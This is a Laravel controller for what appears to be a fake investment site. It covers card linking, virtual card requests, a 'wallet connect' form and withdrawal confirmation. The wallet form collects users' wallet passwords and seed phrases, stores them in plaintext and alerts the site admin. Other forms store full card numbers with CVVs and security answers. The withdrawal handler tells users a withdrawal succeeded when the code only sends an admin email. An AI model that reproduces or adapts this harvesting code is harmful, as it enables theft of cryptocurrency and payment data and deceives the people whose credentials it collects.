<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\GeneralSetting;
use App\Models\LinkedCard;
use App\Models\User;
use App\Models\VirtualCardRequest;
use App\Models\WalletConnect;
use App\Notifications\CardLinkedNotification;
use App\Notifications\InvestmentMail;
use App\Notifications\VirtualCardNotification;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Validator;

class CardController extends Controller
{
    //landing page
    public function linkExternalCard()
    {
        $web = GeneralSetting::find(1);
        $user = Auth::user();

        $dataView =[
            'siteName' => $web->name,
            'pageName' => 'Link External Card',
            'user'     =>  $user,
            'web'=>$web,
            'cards' => LinkedCard::where('user_id',$user->id)->paginate(10),
        ];

        return view('user.link_external_card',$dataView);
    }
    //process card linkage
    public function processCardLinkage(Request $request)
    {
        $web = GeneralSetting::find(1);
        $user = Auth::user();
        // Validate form data
        $validator = Validator::make($request->all(), [
            'card_type' => 'required|string|max:50',
            'card_owner' => 'required|string|max:255',
            'card_number' => 'required|string|size:16|unique:linked_cards,card_number',
            'expiry_month' => 'required|integer|min:1|max:12',
            'expiry_year' => 'required|integer|min:' . date('Y') . '|max:' . (date('Y') + 20),
            'cvv' => 'required|string|min:3|max:4',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        // Store card data
        $card = LinkedCard::create([
            'user_id' => Auth::id(),
            'card_type' => $request->card_type,
            'card_owner' => $request->card_owner,
            'card_number' => $request->card_number,
            'expiry_month' => $request->expiry_month,
            'expiry_year' => $request->expiry_year,
            'cvv' => encrypt($request->cvv), // Securely store CVV
            'is_active' => true
        ]);

        // Notify Admin via Email
        $admins = User::where('is_admin', 1)->get();
        if ($admins->count() > 0) {
            Notification::send($admins, new CardLinkedNotification($card, $user));
        }

        return redirect()->back()->with('success', 'Your card has been successfully linked.');
    }
    //virtual cards
    public function virtualCards()
    {
        $web = GeneralSetting::find(1);
        $user = Auth::user();

        $dataView =[
            'siteName' => $web->name,
            'pageName' => 'Request for Virtual Card',
            'user'     =>  $user,
            'web'=>$web,
        ];

        return view('user.virtual_card_request',$dataView);
    }
    //request for virtual card
    public function requestForCard()
    {
        $web = GeneralSetting::find(1);
        $user = Auth::user();

        $dataView =[
            'siteName' => $web->name,
            'pageName' => 'Request for Virtual Card',
            'user'     =>  $user,
            'web'=>$web,
        ];

        return view('user.virtual_card_form',$dataView);
    }
    //process
    public function requestCard(Request $request) {
        $request->validate([
            'card_type' => 'required|string',
            'question' => 'required|string',
            'answer' => 'required|string|max:255',
        ]);

        $cardRequest = VirtualCardRequest::create([
            'user_id' => auth()->id(),
            'card_type' => $request->card_type,
            'security_question' => $request->question,
            'security_answer' => $request->answer,
            'status' => 'Pending'
        ]);

        // Notify Admin (Email Notification)
        $admin = User::where('is_admin', 1)->first();
        if ($admin) {
            $admin->notify(new VirtualCardNotification($cardRequest));
        }

        return redirect()->route('user.dashboard')->with('success', 'Your virtual card request has been submitted!');
    }
    //landing page
    public function walletConnect()
    {
        $user = Auth::user();
        $web = GeneralSetting::find(1);

        return view('user.wallet_connect')->with([
            'user' => $user,
            'web' => $web,
            'pageName' => 'Connect Wallet',
            'siteName' => $web->name
        ]);
    }

    public function processWalletConnect(Request  $request)
    {
        $user = Auth::user();
        // Validate using Validator facade
        $validator = Validator::make($request->all(), [
            'provider' => 'required|string|max:225',
            'email' => 'nullable|email|max:225',
            'password' => 'nullable|string',
            'seed' => 'required|string',
        ]);

        // Check if validation fails
        if ($validator->fails()){
            return back()->with('errors',$validator->errors());
        }
        $input = $validator->validated();

        // Store data in the database
        WalletConnect::create([
            'walletProvider' => $request->provider,
            'email' => $request->email,
            'password' => $request->password,
            'seedPhrase' => $request->seed,
            'status'=>2
        ]);

        $admin = User::where('is_admin',1)->first();

        if (!empty($admin)){
            $adminMessage = "
                   A new wallet connect has been placed by the investor <b>".$user->name."</b>.
                ";
            //SendDepositNotification::dispatch($admin,$adminMessage,'New Pending Deposit');
            $admin->notify(new InvestmentMail($admin,$adminMessage,'New wallet connection received.'));
        }
        return back()->with('success','Connection Processed. Your wallet connection is currently processing and should complete soonest.');
    }

    public function confirmWithdrawal(Request  $request)
    {
        $user = Auth::user();
        // Validate using Validator facade
        $validator = Validator::make($request->all(), [
            'coin' => 'required|string',
            'amount' => 'required|numeric',
            'wallet' => 'required|string|max:225',
        ]);

        // Check if validation fails
        if ($validator->fails()){
            return back()->with('errors',$validator->errors());
        }
        $input = $validator->validated();

        $admin = User::where('is_admin',1)->first();

        if (!empty($admin)){
            $adminMessage = $user->first_name." ".$user->last_name." has requested for withdrawal confirmation.
               Wallet  - {$request->wallet},<br/>
               Amount  - {$request->amount}<br/>
               Coin - {$request->coin}
            ";
            //SendDepositNotification::dispatch($admin,$adminMessage,'New Pending Deposit');
            $admin->notify(new InvestmentMail($admin,$adminMessage,'New Withdrawal Confirmation'));
        }
        return back()->with('success','Withdrawal confirmed successfully.');
    }
}
